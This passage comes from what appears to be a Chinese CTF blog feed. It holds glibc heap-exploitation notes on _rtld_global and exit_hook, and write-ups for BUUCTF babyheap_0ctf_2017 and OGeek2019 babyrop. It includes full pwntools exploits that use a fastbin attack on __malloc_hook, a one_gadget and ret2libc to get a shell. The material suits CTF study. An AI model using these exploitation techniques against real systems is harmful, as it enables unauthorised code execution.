<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 计算 _rtld_global._dl_ns._ns_loaded.l_next-&gt;l_next-&gt;l_next 的真实地址</span></span><br><span class="line">rtld_global = libc_base + offset</span><br><span class="line">rtld_next_next_next = rtld_global -<span class="number">0x31028</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># largebin attack 中</span></span><br><span class="line">target_addr = rtld_next_next_next</span><br><span class="line"><span class="comment"># 修改 chunk.bk_nextsize 时</span></span><br><span class="line">chunk.bk_nextsize = rtld_next_next_next - <span class="number">0x20</span></span><br></pre></td></tr></table></figure>
<p>largebin attack 以后，观察 _rtld_global，应该有这样一条链
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_rtld_global._dl_ns._ns_loaded        = 0x7f... head_node</span><br><span class="line">              |</span><br><span class="line">              |  (*_ns_loaded) + 0x18</span><br><span class="line">              v</span><br><span class="line">_rtld_global._dl_ns._ns_loaded.l_next = 0x7f... node_1</span><br><span class="line">              |</span><br><span class="line">              |  (*(xx.l_next)) + 0x18</span><br><span class="line">              v</span><br><span class="line">..._ns_loaded.l_next-&gt;l_next          = 0x7f... node_2</span><br><span class="line">              |</span><br><span class="line">              |  (*(xx-&gt;l_next)) + 0x18</span><br><span class="line">              v</span><br><span class="line">...l_next-&gt;l_next-&gt;l_next             = 0x55...(堆地址) node_3</span><br><span class="line"># 链上正好四个 node</span><br></pre></td></tr></table></figure></p>
<h3 id="构造-fake-chunk">[2-1-3] 构造 fake chunk</h3>
<p>我们假设： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">                    |-----------|-----------|</span><br><span class="line">fake_rtld_global -&gt; | perv_size |    size   |</span><br><span class="line">                    |-----------|-----------|</span><br><span class="line">                    |       user_data       |</span><br><span class="line">                    |         . . .         |</span><br><span class="line">                    |-----------|-----------|</span><br></pre></td></tr></table></figure></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 我看的 wp 大多数都在构造 fake chunk 时用到了 libc + 一个偏移量,</span></span><br><span class="line"><span class="comment"># 但我这样构造也能 getshell,</span></span><br><span class="line"><span class="comment"># 以下就只需要修改 heap_base 和 offset 就行,</span></span><br><span class="line"><span class="comment"># 对 libc 的要求小了很多.</span></span><br><span class="line">heap_base = 堆的基地址</span><br><span class="line">offset    = fake chunk 的 prev_size 地址</span><br><span class="line">fake_rtld_global = heap_base + offset</span><br><span class="line">payload  = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(fake_rtld_global)</span><br><span class="line">payload  = payload.ljust(<span class="number">0x38</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload += p64(fake_rtld_global + <span class="number">0x58</span>) + p64(<span class="number">0x8</span>) + p64(one_gadget[<span class="number">0</span>])</span><br><span class="line">payload  = payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload += p64(fake_rtld_global + <span class="number">0x40</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(fake_rtld_global + <span class="number">0x48</span>)</span><br><span class="line">payload  = payload.ljust(<span class="number">0x30c</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(<span class="number">0x1c</span>)</span><br></pre></td></tr></table></figure>
<p>最后构造的 chunk 应该如下</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; tele 0x5644419bbcd0 40</span><br><span class="line">00:0000│  0x5644419bbcd0 ◂— 0x0</span><br><span class="line">01:0008│  0x5644419bbcd8 ◂— 0x521</span><br><span class="line">02:0010│  0x5644419bbce0 ◂— 0x0</span><br><span class="line">... ↓     2 skipped</span><br><span class="line">05:0028│  0x5644419bbcf8 —▸ 0x5644419bbcd0 ◂— 0x0</span><br><span class="line">06:0030│  0x5644419bbd00 ◂— 0x0</span><br><span class="line">... ↓     2 skipped</span><br><span class="line">09:0048│  0x5644419bbd18 —▸ 0x5644419bbd28 —▸ 0x7f77ff49154c (execvpe+652) ◂— mov rdx, r12</span><br><span class="line">0a:0050│  0x5644419bbd20 ◂— 0x8</span><br><span class="line">0b:0058│  0x5644419bbd28 —▸ 0x7f77ff49154c (execvpe+652) ◂— mov rdx, r12</span><br><span class="line">0c:0060│  0x5644419bbd30 ◂— 0x0</span><br><span class="line">... ↓     21 skipped</span><br><span class="line">22:0110│  0x5644419bbde0 —▸ 0x5644419bbd10 ◂— 0x0</span><br><span class="line">23:0118│  0x5644419bbde8 ◂— 0x0</span><br><span class="line">24:0120│  0x5644419bbdf0 —▸ 0x5644419bbd18 —▸ 0x5644419bbd28 —▸ 0x7f77ff49154c (execvpe+652) ◂— mov rdx, r12</span><br><span class="line">25:0128│  0x5644419bbdf8 ◂— 0x0</span><br><span class="line">... ↓     2 skipped</span><br></pre></td></tr></table></figure>
<h2 id="rtld_global.exit_hook">[2-2] _rtld_global.exit_hook</h2>
<blockquote>
<p>libc: 2.23 / 2.27 (其他版本未记录)</p>
</blockquote>
<h3 id="exit_hook-调用链">[2-2-1] exit_hook 调用链</h3>
<p>exit --&gt; __run_exit_handlers --&gt; _dl_fini --&gt;
__rtld_lock_lock_recursive / __rtld_lock_unlock_recursive</p>
<h3 id="poc">[2-2-2] POC</h3>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">gdb 中输入</span></span><br><span class="line">p _rtld_global # 查看 exit_hook 调用的两个 recursive 函数的地址</span><br><span class="line"></span><br><span class="line">p __rtld_lock_unlock_recursive # 查看 __rtld_lock_unlock_recursive 指向的数据</span><br></pre></td></tr></table></figure>
<p>libc2.23 中：</p>
<p>exit_hook_addr = libc_base+0x5f0040+3848</p>
<p>exit_hook_addr = libc_base+0x5f0040+3856</p>
<p>在libc-2.27中</p>
<p>exit_hook_addr = libc_base+0x619060+3840</p>
<p>exit_hook_addr = libc_base+0x619060+3848</p>
]]></content>
      <categories>
        <category>CTF_Theory</category>
      </categories>
      <tags>
        <tag>Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>Pwn - Practice1</title>
    <url>/2023/08/14/Pwn%20-%20Practice1/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
练习题 wp 记录
</blockquote>
<span id="more"></span>
<h1 id="目录">目录</h1>
<ul>
<li><a href="#0x00-tools-in-pwn">Tools in pwn</a></li>
<li><a href="#0x01-buuctf-babyheap_0ctf_2017">buuctf
babyheap_0ctf_2017</a></li>
<li><a href="#0x02-buuctf-ogeek2019babyrop_wp">buuctf
ogeek2019babyrop_wp</a></li>
<li><a href="#0x03-buuctf-hitcontraining_bamboobox">buuctf
hitcontraining_bamboobox</a></li>
<li><a href="#0x04-hitcontraining_uaf">buuctf
hitcontraining_uaf</a></li>
<li><a href="#0x05-hitcontraining_magicheap">buuctf
hitcontraining_magicheap</a></li>
<li><a href="#0x06-ciscn_2019_n_3">buuctf ciscn_2019_n_3</a></li>
<li><a href="#0x07-babyfengshui_33c3_2016">buuctf
babyfengshui_33c3_2016</a></li>
<li><a href="#0x08-hitcontraining_heapcreator">buuctf
hitcontraining_heapcreator</a></li>
<li><a href="#0x09-hitcon2014_stkof">buuctf hitcon2014_stkof</a></li>
<li><a href="#0x0a-jarvisoj_level5">buuctf jarvisoj_level5</a></li>
<li><a href="#0x0b-ciscn_2019_es_7">buuctf ciscn_2019_es_7</a></li>
</ul>
<h1 id="x00-tools-in-pwn">0x00 Tools in Pwn</h1>
<h2 id="pwndbg">pwndbg</h2>
<ol type="1">
<li><p>gdb.attach(io,'xxx')</p>
<ol type="1">
<li>xxx 为 GDB 的调试语句，比如'b main' 或者 'n 285'</li>
</ol></li>
</ol>
<h2 id="gadgets">gadgets</h2>
<h3 id="ropgadget">ROPgadget</h3>
<ol type="1">
<li><p>面向 elf 文件使用，详情RTFM<code>ROPgadget -h</code></p></li>
<li><p>命令省流</p>
<ol type="1">
<li><p><code>ROPgadget --binary ./pwn --only "pop|ret" | grep rdi</code></p></li>
<li><p><code>ROPgadget --binary ./pwn --string 'sh'</code></p></li>
</ol></li>
</ol>
<h3 id="one_gadget">one_gadget</h3>
<ol type="1">
<li><p>面向 libc 库使用</p></li>
<li><p>命令 <code>one_gadget ./libc.so.6</code></p></li>
</ol>
<h2 id="seccomp-tools">seccomp-tools</h2>
<ol type="1">
<li><p>面向 elf 文件使用</p></li>
<li><p>命令 <code>seccomp-tools dump ./pwn</code></p></li>
</ol>
<blockquote class="blockquote-center">
第一道Heap，插个里程碑纪念一下XD
</blockquote>
<h1 id="x01-buuctf-babyheap_0ctf_2017">0x01 BUUCTF
babyheap_0ctf_2017</h1>
<h2 id="写在前面">0. 写在前面</h2>
<p>七月学完栈溢出，ak掉buu前两页的所有栈题<br />
八月本来是想把堆学穿，等回想起这个目标前半个月已经没了<br />
参加了个数据安全的夏令营<br />
给sdu的新生赛搞宣传（本来想出点签到题结果已经被人出好了TT^TT）<br />
给SecretFlow审了一点go语言的洞<br />
然后用C#和xaml给sdu校园网写了个一键修复脚本<br />
总而言之学的很杂...说实话真不如多打点比赛。<br />
本来栈的能力就没得到比赛的检验，堆的学习时间又所剩无几了...<br />
总而言之还是脚踏实地学一点算一点吧<br />
还有个南大PA的坑等着我去填呢...才刚把nemu的gdb实现了个单步步入...</p>
<blockquote>
<p>做完这道题才算真正意义上的AK第一页XD</p>
</blockquote>
<h2 id="主要知识点">Ⅰ. 主要知识点</h2>
<ol type="1">
<li>堆溢出</li>
</ol>
<h2 id="解题步骤">Ⅱ. 解题步骤</h2>
<ol type="1">
<li>checksec 保护全开</li>
</ol>
<p><img src="/pic/Pasted%20image%2020230814133847.png" /></p>
<ol start="2" type="1">
<li><p>该elf文件在ubuntu16中创建，wsl用的本机libc肯定不合适，所以<code>patchelf</code>一下<br />
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">patchelf --set-interpreter ./glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64/ld-2.23.so --replace-needed libc.so.6 ./glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64/libc.so.6</span><br></pre></td></tr></table></figure></p></li>
<li><p>拖进IDA64分析，让反汇编以后的代码好看一点<br />
<img src="/pic/Pasted%20image%2020230814134313.png" /> <img
src="/pic/Pasted%20image%2020230814134623.png" />
注：IDA中快捷键y可以修改变量类型，上图Alloc函数的我将a1的变量类型<code>_int64</code>修改为<code>_int64*</code></p></li>
<li><p>IDA分析可知，我们可以有以下思路：</p>
<ol type="1">
<li>Fill函数的输入字符数量是受我们控制的，所以可以堆溢出；</li>
<li>由于本题并没有给出system等可以直接提权的函数，所以考虑泄露libc地址
<ol type="1">
<li>要泄露libc地址，肯定要读存有libc地址的地址
<ol type="1">
<li>哪里存着libc地址？unsorted
bin仅有一个chunk时，此chunk的fd和bk都指向<code>地址main_arena+58</code>，而main_arena是libc的data段中的一个全局静态变量，所以泄露它就可以知道libc_base（注：此处存放的是topchunk的地址）</li>
<li>怎么去读unsorted bin的fd/bk指针？堆溢出+多次free/alloc</li>
</ol></li>
</ol></li>
<li>有了libc地址，我们可以通过修改fastbin的fd指针，在程序的__malloc_hook处(用libc+偏移来计算)申请一个我们可以操控的堆块，并在其中写入og的地址来提权</li>
</ol></li>
<li><p>大概思路我们有了，接下来是写exp+调试验证思路。我们为了能够将chunk放入unsorted
bin，肯定需要一个small chunk；要fastbin attack，肯定需要两个fastbin
chunk；为了方便控制这三个chunk，我们再设置两个fastbin chunk，即：
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#index = 0</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#index = 1</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#index = 2</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#index = 3</span></span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment">#index = 4</span></span><br></pre></td></tr></table></figure> 此时堆的情况如下 <img
src="/pic/Pasted%20image%2020230814140742.png" /></p></li>
<li><p>Free掉index为1和2的chunk，给后面alloc留出空间 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
heap情况如下 <img src="/pic/Pasted%20image%2020230814141436.png" />
bin情况如下 <img
src="/pic/Pasted%20image%2020230814141724.png" /></p></li>
<li><p>堆溢出，操控fastbin</p>
<ol type="1">
<li>现在是main_arena_fastbin_0x20 ---&gt; chunk2 ---&gt;chunk1</li>
<li>我们想办法让它变成 xxx_0x20 ---&gt; chunk2 ---&gt;chunk4
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = (p64(<span class="number">0</span>)*<span class="number">3</span> +p64(<span class="number">0x21</span>))*<span class="number">2</span> + p8(<span class="number">0x80</span>)</span><br><span class="line">fill(<span class="number">0</span>,payload)</span><br></pre></td></tr></table></figure>
（这里读者可以自己gdb.attach用bin命令去查看fastbin前后的状态）</li>
</ol></li>
<li><p>由于从fastbin申请chunk时会检查fastbin中chunk的size，如果不匹配则报错，所以我们要通过堆溢出修改chunk4的size，让其从0x91变为0x21
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br></pre></td></tr></table></figure></p></li>
<li><p>申请两个大小为0x10的chunk，可以看到<code>原chunk1</code>指向了<code>原chunk2的地址</code>，<code>原chunk2</code>指向了<code>原chunk4的地址</code>，这样我们就有两个指针指向chunk4了，可以用一个指针来释放，一个指针来读取，方便阅读我们分别命名为pointer_chunk4和pointer_chunk2
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">alloc(<span class="number">0x10</span>)</span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br></pre></td></tr></table></figure> heap情况如下 <img
src="/pic/Pasted%20image%2020230814143302.png" /></p></li>
<li><p>直接用pointer_chunk4释放chunk4，ptmalloc会因为找不到topchunk而报错。所以我们应该恢复chunk4的size到0x91再free，但这样会导致chunk4直接跟topchunk合并。所以我们要先恢复chunk4的size到0x91再申请一个0x80大小的堆块隔离topchunk再free
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br><span class="line">alloc(<span class="number">0x80</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br></pre></td></tr></table></figure></p></li>
<li><p>此时chunk4的fd和bk就已经存放着一个地址了，我们通过pointer_chunk2来把他读出来。这个地址是main_arena+88，打开libc可以看到main_arena的地址为0x3c4b20，所以我们获得的libc_addr需要减88再减0x3c4b20，即减去0x3C4B78
<img src="/pic/Pasted%20image%2020230814144704.png" />
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dump(<span class="number">2</span>)</span><br><span class="line">libc_base = u64(io.recv(<span class="number">16</span>)[-<span class="number">8</span>:])-<span class="number">0x3c4b78</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base   ---&gt;   &quot;</span>,<span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure></p></li>
<li><p>我们现在有了libc的地址，下一步是劫持malloc_hook。由于我们要通过fastbin来在malloc_hook处申请堆块，所以我们要通过fastbin对于size的检验，所以看一下malloc_hook前面有没有我们能够申请堆块的地方
<img src="/pic/Pasted%20image%2020230814145721.png" />
发现aed处的0x0000007f符合fastbin的空间，所以我们用libc_base+0x3c4aed(这个用当前地址减去基地址即可算出)来申请<br />
⚠这里图aed写错了，而且不应该看这个界面，整体上的chunk应该是
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aed  0x----------------(prev_size) 0x000000000000007f(size)</span><br><span class="line">afd  ---------------------user_data-----------------------</span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p></li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">alloc(<span class="number">0x60</span>)                                    <span class="comment"># 将unsortedbin中的chunk4切0x60大小申请出来</span></span><br><span class="line">free(<span class="number">4</span>)                                        <span class="comment"># 把chunk4放到fastbin中，便于用pointer_chunk2操控</span></span><br><span class="line">payload = p64(libc_base+<span class="number">0x3c4aed</span>)              <span class="comment"># 把申请块写进malloc_hook前面</span></span><br><span class="line">fill(<span class="number">2</span>,payload)                                <span class="comment"># 这一步后，fastbin: main_arena ---&gt; chunk4 ---&gt; _ + 0x3c4aed</span></span><br><span class="line">alloc(<span class="number">0x60</span>)                                    <span class="comment"># 把chunk4申请回来</span></span><br><span class="line">alloc(<span class="number">0x60</span>)                                    <span class="comment"># 在malloc_hook处构造堆，index=6</span></span><br></pre></td></tr></table></figure>
<ol start="13" type="1">
<li><p>我们修改chunk6的内容，即修改malloc_hook，我们用og来提权
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">19</span> + p64(libc_base + <span class="number">0x4526a</span>)</span><br><span class="line">fill(<span class="number">6</span>,payload)</span><br></pre></td></tr></table></figure></p></li>
<li><p>若malloc_hook不为空，再申请堆时会先调用malloc_hook处的函数，所以随便申请即可cat
flag <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">alloc(<span class="number">255</span>)</span><br></pre></td></tr></table></figure></p></li>
</ol>
<h3 id="完整exp">Ⅲ. 完整EXP</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">domain_name = <span class="string">&#x27;node4.buuoj.cn&#x27;</span></span><br><span class="line">port = <span class="number">25970</span></span><br><span class="line">file = <span class="string">&#x27;./babyheap_0ctf_2017&#x27;</span></span><br><span class="line">  </span><br><span class="line"><span class="comment"># io = remote(domain_name,port)</span></span><br><span class="line">io = process(file)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b main&#x27;)</span></span><br><span class="line">  </span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">size</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Command: &#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Size: &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">index, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Command: &#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Size: &#x27;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Content: &#x27;</span>,content)</span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Command: &#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Command: &#x27;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    io.recvline()</span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">  </span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br><span class="line">alloc(<span class="number">0x80</span>)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">  </span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">  </span><br><span class="line">payload = (p64(<span class="number">0</span>)*<span class="number">3</span> +p64(<span class="number">0x21</span>))*<span class="number">2</span> + p8(<span class="number">0x80</span>)</span><br><span class="line">fill(<span class="number">0</span>,payload)</span><br><span class="line">  </span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">  </span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">  </span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">  </span><br><span class="line">alloc(<span class="number">0x80</span>)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">  </span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">  </span><br><span class="line">dump(<span class="number">2</span>)</span><br><span class="line">libc_base = u64(io.recv(<span class="number">16</span>)[-<span class="number">8</span>:])-<span class="number">0x3c4b78</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base   ---&gt;   &quot;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line">  </span><br><span class="line">gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">alloc(<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">  </span><br><span class="line">payload = p64(libc_base+<span class="number">0x3c4aed</span>)</span><br><span class="line">fill(<span class="number">2</span>,payload)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">  </span><br><span class="line">alloc(<span class="number">0x60</span>)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">  </span><br><span class="line">alloc(<span class="number">0x60</span>)</span><br><span class="line">  </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">19</span> + p64(libc_base + <span class="number">0x4526a</span>)</span><br><span class="line">fill(<span class="number">6</span>,payload)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">  </span><br><span class="line">alloc(<span class="number">255</span>)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">  </span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="一些疑问">Ⅳ. 一些疑问</h2>
<ol type="1">
<li><p>__malloc_hook不是在data段中吗？这题开了FULL
RELRO为什么可以改啊🤔</p></li>
<li><p>第九步中heap中chunk2的Addr为什么还是40而不是80啊？</p></li>
<li><p>第十步为什么chunk4会跟topchunk合并？是哪个bin的机制？</p>
<ol type="1">
<li>unsortedbin，后向合并</li>
</ol></li>
<li><p><strong><em>为什么非要在aed处申请堆块？</em></strong></p>
<ol type="1">
<li>fastbin指针指向0xaed，说明0xaed-8是size，0xaed-0x10是prev_size，正好伪装chunk</li>
</ol></li>
</ol>
<h1 id="x02-buuctf-ogeek2019babyrop_wp">0x02 buuctf
[OGeek2019]babyrop_wp</h1>
<blockquote>
<p>网上很多wp已经不适用了，所以来更新一波XD</p>
</blockquote>
<h2 id="x00-知识点">0x00 知识点</h2>
<ol type="1">
<li>ret2libc</li>
<li>提供libc的打法</li>
<li>绕过strlen &amp; strncmp函数</li>
</ol>
<h2 id="x01-解题步骤">0x01 解题步骤</h2>
<blockquote>
<p>不贴图了，按伪代码顺序来</p>
</blockquote>
<ol type="1">
<li>fd是urandom库生成的随机数</li>
<li>将fd读4位进buf</li>
<li>将buf作为参数传进函数A，在A中称作a1</li>
<li>将a1读进s</li>
<li><strong>用户输入buf</strong>，但限制读入长度0x20，无法溢出；但可以考虑泄露</li>
<li>v1赋值为buf的长度，绕过strlen &amp; strncmp函数可以用'\x00'</li>
<li>返回buf[7]，传入函数B，在B中称作a1，是read的检测长度，如果足够长可以构造溢出
于是函数A中的read我们有思路了，即 1. 绕过strlen 2. 返回buf[7]越大越好
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload  =  &#x27;\x00&#x27; + &#x27;\xff&#x27; * 7</span><br><span class="line"></span><br><span class="line">io.sendline(payload)                              # Q1：为什么非得是sendline而不能是send？</span><br><span class="line"></span><br><span class="line">io.recvuntil(b&quot;Correct\n&quot;)</span><br></pre></td></tr></table></figure></li>
<li>B中观察栈的结构可知，我们可以用0xE7+4的垃圾数据抵达返回地址</li>
<li>由于string中并没有找到system('/bin/sh')，而题目提供了libc，所以我们可以泄露libc基地址；由于函数B结束后程序即将结束，我们已经没有溢出的点了，所以考虑将main作为返回地址，再来提供一次溢出，所以考虑构造payload2：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xxxxxx</span><br><span class="line">xxxxxx&lt;-----垃圾数据</span><br><span class="line">puts_plt&lt;---调用puts</span><br><span class="line">main_addr&lt;--将puts的返回地址压栈，即将eip的下一条指令压栈</span><br><span class="line">puts_got&lt;---将puts的参数弹给puts</span><br><span class="line"></span><br><span class="line">junk     =  0xE7 + 4</span><br><span class="line"></span><br><span class="line"># payload  =  b&#x27;a&#x27;*junk + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4)</span><br><span class="line"></span><br><span class="line">payload  =  b&#x27;a&#x27;*junk + p32(puts_plt) + p32(main_addr) + p32(puts_got)      # Q2: puts为什么不会打印后面的内容了？为什么puts_got后面一定是可以被转换为0a的00？</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">puts_addr =  u32(io.recv(4))</span><br><span class="line"></span><br><span class="line">print(&#x27;puts_addr   ---&gt;   &#x27;,hex(puts_addr))</span><br><span class="line"></span><br><span class="line"># 注1：puts(const char* arg1)一直打印，直到遇到&#x27;\0&#x27;，丢弃&#x27;\0&#x27;并输出&#x27;\n&#x27;</span><br><span class="line"># 注2：sszie_t write(fd,const char* src,length) (fd=1,length=32/8 or 64/8)</span><br></pre></td></tr></table></figure></li>
<li>泄露libc地址后，泄露<code>system</code>和<code>/bin/sh</code>的地址
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">offset   = puts_addr - libc.sym[&#x27;puts&#x27;]</span><br><span class="line"></span><br><span class="line">sys_addr = offset + libc.sym[&#x27;system&#x27;]</span><br><span class="line"></span><br><span class="line">bin_sh   = offset + next(libc.search(b&#x27;/bin/sh&#x27;))</span><br></pre></td></tr></table></figure></li>
<li>再进行一次绕过strncmp <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload  =  &#x27;\x00&#x27; + &#x27;\xff&#x27; * 7</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(b&quot;Correct\n&quot;)</span><br></pre></td></tr></table></figure></li>
<li>最后提权 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload  =  b&#x27;a&#x27;* junk + p32(sys_addr) + p32(0) + p32(bin_sh)    # 细节2：覆盖返回地址时，32位需要在栈上补充返回地址</span><br><span class="line">                                                                 # Q3：为什么？</span><br><span class="line">io.send(payload)</span><br><span class="line">  </span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></li>
<li>最后贴一下全部exp <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">io = remote(&#x27;node4.buuoj.cn&#x27;,26218)</span><br><span class="line"># context(os=&#x27;linux&#x27;, arch=&#x27;i386&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line">elf = ELF(&#x27;./pwn&#x27;)</span><br><span class="line">libc = ELF(&#x27;libc-2.23.so&#x27;)</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">  </span><br><span class="line">puts_got =elf.got[&#x27;puts&#x27;]</span><br><span class="line">puts_plt =elf.plt[&#x27;puts&#x27;]</span><br><span class="line">main_addr = 0x08048825</span><br><span class="line">  </span><br><span class="line">payload  =  &#x27;\x00&#x27; + &#x27;\xff&#x27; * 7</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(b&quot;Correct\n&quot;)</span><br><span class="line">  </span><br><span class="line">junk     =  0xE7 + 4</span><br><span class="line">payload  =  b&#x27;a&#x27;*junk + p32(puts_plt) + p32(main_addr) + p32(puts_got)</span><br><span class="line">puts_addr =  u32(io.recv(4))</span><br><span class="line">print(&#x27;puts_addr   ---&gt;   &#x27;,hex(puts_addr))</span><br><span class="line">  </span><br><span class="line">offset   = puts_addr - 